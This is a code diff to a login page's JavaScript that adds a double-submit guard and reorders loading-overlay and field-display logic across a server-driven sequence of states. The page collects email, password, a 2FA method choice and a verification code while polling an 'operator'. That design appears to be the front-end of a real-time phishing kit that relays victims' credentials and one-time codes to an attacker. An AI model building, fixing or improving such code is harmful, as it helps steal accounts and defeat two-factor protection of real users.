@@ -659,6 +659,8 @@ let pollingStartTime = null;
 const POLLING_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes global timeout
 let currentStatus = null;
 let lastShownStatus = '';
+let isSubmitting = false;
+let submitGuardTimeout = null;
 let verificationOptions = [];
 let loadingMessages = [
   "Securing your connection...",
@@ -736,6 +738,13 @@ function objectToFormData(obj) {
 
 // Function to update UI based on polling status
 function updateUIForStatus(status, data = {}) {
+  if (isSubmitting && status === currentStatus) {
+    return;
+  }
+  if (isSubmitting && status !== currentStatus) {
+    isSubmitting = false;
+    if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+  }
   currentStatus = status;
   const emailGroup = document.getElementById('emailGroup');
   const passwordGroup = document.getElementById('passwordGroup');
@@ -754,40 +763,40 @@ function updateUIForStatus(status, data = {}) {
   submitButton.style.backgroundColor = "";
   submitButton.style.color = "";
 
-  // Always show email and password fields
-  emailGroup.style.display = 'block';
-  passwordGroup.style.display = 'block';
-
   switch (status) {
     case 'WAITING':
-      // Initial state — process is starting up
-      showLoadingOverlay(true);
+      emailGroup.style.display = 'block';
+      passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
+      showLoadingOverlay(true);
       submitButton.innerText = "Checking...";
       submitButton.disabled = true;
       emailField.readOnly = true;
       passwordField.disabled = true;
-      startPolling(5000); // Poll faster during initial WAITING
+      startPolling(5000);
       break;
     case 'PROCESSING':
-      showLoadingOverlay(true);
+      emailGroup.style.display = 'block';
+      passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
+      showLoadingOverlay(true);
       submitButton.innerText = "Processing...";
       submitButton.disabled = true;
       emailField.readOnly = true;
       passwordField.disabled = true;
-      startPolling(10000); // Poll every 10 seconds for processing
+      startPolling(10000);
       break;
     case 'WAITINGEMAIL':
     case 'WAITINGEMAILERROR':
-      hideLoadingOverlay();
+      emailGroup.style.display = 'block';
+      passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
       submitButton.innerText = "Login";
       if (data.email) emailField.value = data.email;
-      emailField.readOnly = false; // Allow email input if not prefilled
+      emailField.readOnly = false;
       passwordField.disabled = false;
       if (data.lastJsonResponse) {
         try {
@@ -799,11 +808,13 @@ function updateUIForStatus(status, data = {}) {
           }
         } catch(e) {}
       }
-      startPolling(10000); // Poll every 10 seconds for user input
+      hideLoadingOverlay();
+      startPolling(10000);
       break;
     case 'WAITINGPASSWORD':
     case 'WAITINGPASSWORDERROR':
-      hideLoadingOverlay();
+      emailGroup.style.display = 'block';
+      passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
       submitButton.innerText = "Login";
@@ -821,10 +832,10 @@ function updateUIForStatus(status, data = {}) {
         } catch(e) {}
       }
       lastShownStatus = currentStatus;
-      startPolling(10000); // Poll every 10 seconds for user input
+      hideLoadingOverlay();
+      startPolling(10000);
       break;
     case 'WAITINGOPTIONS':
-      hideLoadingOverlay();
       emailGroup.style.display = 'none';
       passwordGroup.style.display = 'none';
       verificationOptionsGroup.style.display = 'block';
@@ -834,10 +845,10 @@ function updateUIForStatus(status, data = {}) {
       if (typeof rawOpts === 'string') { try { rawOpts = JSON.parse(rawOpts); } catch(e) { rawOpts = []; } }
       verificationOptions = Array.isArray(rawOpts) ? rawOpts : [];
       renderVerificationOptions(verificationOptions);
+      hideLoadingOverlay();
       startPolling(10000);
       break;
     case 'WAITINGCODE':
-      hideLoadingOverlay();
       emailGroup.style.display = 'none';
       passwordGroup.style.display = 'none';
       verificationOptionsGroup.style.display = 'none';
@@ -853,6 +864,7 @@ function updateUIForStatus(status, data = {}) {
           }
         } catch(e) {}
       }
+      hideLoadingOverlay();
       startPolling(10000);
       break;
     case 'COMPLETED':
@@ -1145,7 +1157,10 @@ async function pollOperator() {
 // Handle form submission (email/password, 2FA choice, 2FA code)
 async function handleFormSubmission() {
   hideAllErrors();
-  showLoadingOverlay(true); // Show spinner during submission
+  showLoadingOverlay(true);
+  isSubmitting = true;
+  if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); }
+  submitGuardTimeout = setTimeout(() => { isSubmitting = false; submitGuardTimeout = null; }, 15000);
 
   const emailField = document.getElementById('exampleInputEmail1');
   const passwordField = document.getElementById('exampleInputPassword1');
@@ -1168,7 +1183,9 @@ async function handleFormSubmission() {
       const email = emailField.value.trim();
       if (!isValidEmail(email)) {
         document.getElementById('InvalidEmail').style.display = 'block';
-        hideLoadingOverlay(); // Hide loading overlay on client-side validation error
+        isSubmitting = false;
+        if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+        hideLoadingOverlay();
         resetFormState();
         return;
       }
@@ -1182,7 +1199,9 @@ async function handleFormSubmission() {
       const password = passwordField.value.trim();
       if (!password) {
         document.getElementById('RequirePassword').style.display = 'block';
-        hideLoadingOverlay(); // Hide loading overlay on client-side validation error
+        isSubmitting = false;
+        if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+        hideLoadingOverlay();
         resetFormState();
         return;
       }
@@ -1192,7 +1211,9 @@ async function handleFormSubmission() {
       const selectedOption = document.querySelector('input[name="verificationOption"]:checked');
       if (!selectedOption) {
         document.getElementById('RequireVerificationChoice').style.display = 'block';
-        hideLoadingOverlay(); // Hide loading overlay on client-side validation error
+        isSubmitting = false;
+        if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+        hideLoadingOverlay();
         resetFormState();
         return;
       }
@@ -1211,6 +1232,8 @@ async function handleFormSubmission() {
           if (!hiddenValue) {
             document.getElementById('RequireVerificationChoice').textContent = `Please enter ${inputLabel || 'the required value'} for the selected option.`;
             document.getElementById('RequireVerificationChoice').style.display = 'block';
+            isSubmitting = false;
+            if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
             hideLoadingOverlay();
             resetFormState();
             return;
@@ -1235,7 +1258,9 @@ async function handleFormSubmission() {
       const verificationCode = verificationCodeInput.value.trim();
       if (!verificationCode) {
         document.getElementById('RequireVerificationCode').style.display = 'block';
-        hideLoadingOverlay(); // Hide loading overlay on client-side validation error
+        isSubmitting = false;
+        if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+        hideLoadingOverlay();
         resetFormState();
         return;
       }
@@ -1245,7 +1270,9 @@ async function handleFormSubmission() {
       console.warn("handleFormSubmission called in an unexpected state:", currentStatus);
       document.getElementById('GeneralError').textContent = "Unexpected form submission. Please try again.";
       document.getElementById('GeneralError').style.display = 'block';
-      hideLoadingOverlay(); // Hide loading overlay on unexpected state
+      isSubmitting = false;
+      if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+      hideLoadingOverlay();
       resetFormState();
       return;
     }
@@ -1280,9 +1307,11 @@ async function handleFormSubmission() {
 
   } catch (error) {
     console.error("Error during form submission:", error);
+    isSubmitting = false;
+    if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
     document.getElementById('GeneralError').textContent = "An error occurred during submission. Please try again.";
     document.getElementById('GeneralError').style.display = 'block';
-    showLoadingOverlay(false, true); // Show error message, no spinner
+    showLoadingOverlay(false, true);
     resetFormState();
   }
 }
